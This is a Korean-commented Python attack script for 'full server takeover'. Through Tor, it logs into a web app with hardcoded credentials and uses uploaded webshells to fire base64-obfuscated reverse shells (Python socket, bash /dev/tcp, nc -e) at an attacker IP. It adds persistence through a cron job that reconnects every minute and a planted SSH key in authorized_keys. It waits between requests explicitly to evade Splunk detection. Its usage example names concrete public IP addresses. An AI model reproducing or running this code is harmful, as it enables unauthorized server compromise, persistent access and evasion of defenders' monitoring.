#!/usr/bin/env python3
"""
서버 완전 탈취
Splunk 탐지 우회 전략
"""

import requests
import sys
import time
import base64
import urllib.parse

def takeover(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print("="*60)
    print("서버 완전 탈취")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 세션 획득\n")

    # ========================================
    # 전략 1: 긴 딜레이로 탐지 회피
    # ========================================
    print("[전략 1] 매우 느린 공격 (탐지 회피)")
    print("="*60)

    webshells = [
        "shell_4727.php",
        "photo.php.jpg",
        "avatar_4727.jpg"
    ]

    # 리버스 쉘 (Python - 안정적)
    reverse_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

    print(f"\n[!] C2 리스너 시작:")
    print(f"    nc -lvnp {attacker_port}\n")

    for i, shell in enumerate(webshells, 1):
        print(f"[시도 {i}/{len(webshells)}] 웹쉘: {shell}")

        # 백그라운드 실행
        bg_cmd = reverse_shell + " &"

        try:
            # cmd 파라미터 사용 (원래 작동했던 방식)
            url = f"{base_url}/file.php?name=uploads/{shell}&cmd={urllib.parse.quote(bg_cmd)}"

            print(f"    [*] 페이로드 전송 중...")
            resp = session.get(url, timeout=10)

            if resp.status_code == 200:
                print(f"    [+] 200 OK")
            else:
                print(f"    [?] Status: {resp.status_code}")

        except requests.exceptions.Timeout:
            print(f"    [+] 타임아웃 (백그라운드 실행 가능성!)")
        except Exception as e:
            print(f"    [-] 오류: {str(e)[:50]}")

        # 매우 긴 대기 (탐지 회피)
        if i < len(webshells):
            print(f"\n[*] 탐지 회피 대기 중... (30초)")
            time.sleep(30)

    # ========================================
    # 전략 2: 단일 요청으로 모든 것 실행
    # ========================================
    print(f"\n[전략 2] 단일 요청 - 멀티 페이로드")
    print("="*60)

    # 여러 리버스 쉘을 한 번에 실행 (하나라도 성공하면 됨)
    multi_payload = f"""
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &
bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 &
nc {attacker_ip} {attacker_port} -e /bin/bash &
""".strip().replace('\n', ';')

    # Base64 인코딩 (난독화)
    b64_multi = base64.b64encode(multi_payload.encode()).decode()
    encoded_cmd = f"echo {b64_multi}|base64 -d|bash"

    print(f"\n[*] 멀티 페이로드 생성 완료")
    print(f"[*] 3가지 리버스 쉘 동시 실행\n")

    try:
        url = f"{base_url}/file.php?name=uploads/{webshells[0]}&cmd={urllib.parse.quote(encoded_cmd)}"

        print(f"[*] 전송 중...")
        resp = session.get(url, timeout=10)

        if resp.status_code == 200:
            print(f"[+] 200 OK")

    except requests.exceptions.Timeout:
        print(f"[+] 타임아웃 (성공 가능성!)")
    except Exception as e:
        print(f"[-] 오류: {str(e)[:50]}")

    # ========================================
    # 전략 3: Cron Job 등록 (Persistence)
    # ========================================
    print(f"\n[전략 3] Cron Job 등록 (자동 재연결)")
    print("="*60)

    cron_cmd = f"(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1') | crontab -"

    print(f"\n[*] Cron Job 등록 중...")
    print(f"[*] 매 분마다 자동 재연결 시도\n")

    time.sleep(35)  # 탐지 회피

    try:
        url = f"{base_url}/file.php?name=uploads/{webshells[0]}&cmd={urllib.parse.quote(cron_cmd)}"

        resp = session.get(url, timeout=10)

        if resp.status_code == 200:
            print(f"[+] Cron Job 등록 완료!")
            print(f"[*] 1분마다 자동으로 연결 시도\n")

    except Exception as e:
        print(f"[-] 오류: {str(e)[:50]}")

    # ========================================
    # 전략 4: SSH 키 주입
    # ========================================
    print(f"\n[전략 4] SSH 공개키 주입")
    print("="*60)

    print(f"\n[*] 공격자 SSH 공개키를 서버에 추가")
    print(f"[!] 로컬에서 SSH 키 생성:")
    print(f"    ssh-keygen -t rsa -f takeover_key")
    print(f"    cat takeover_key.pub\n")

    ssh_pubkey = input("[?] SSH 공개키 입력 (Enter=skip): ").strip()

    if ssh_pubkey:
        ssh_cmd = f"mkdir -p ~/.ssh && echo '{ssh_pubkey}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

        time.sleep(35)  # 탐지 회피

        try:
            url = f"{base_url}/file.php?name=uploads/{webshells[0]}&cmd={urllib.parse.quote(ssh_cmd)}"

            resp = session.get(url, timeout=10)

            if resp.status_code == 200:
                print(f"\n[+] ✅ SSH 키 주입 완료!")
                print(f"[*] 이제 SSH 접속 가능:")
                print(f"    ssh -i takeover_key www-data@{target_ip}")
                print(f"    또는")
                print(f"    ssh -i takeover_key ubuntu@{target_ip}\n")

        except Exception as e:
            print(f"[-] 오류: {str(e)[:50]}")

    # ========================================
    # 결과 확인
    # ========================================
    print(f"\n{'='*60}")
    print(f"[+] 모든 탈취 시도 완료!")
    print(f"{'='*60}")
    print(f"\n[!] C2 리스너 확인:")
    print(f"    nc -lvnp {attacker_port}")
    print(f"\n[*] 연결이 안되면:")
    print(f"    1. 1분 기다려보기 (Cron Job)")
    print(f"    2. SSH 접속 시도")
    print(f"    3. 스크립트 다시 실행 (다른 웹쉘)")
    print(f"\n[*] 연결 성공 시:")
    print(f"    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print(f"    export TERM=xterm")
    print(f"    Ctrl+Z")
    print(f"    stty raw -echo; fg")
    print(f"    reset")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 101_server_takeover.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 101_server_takeover.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    takeover(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
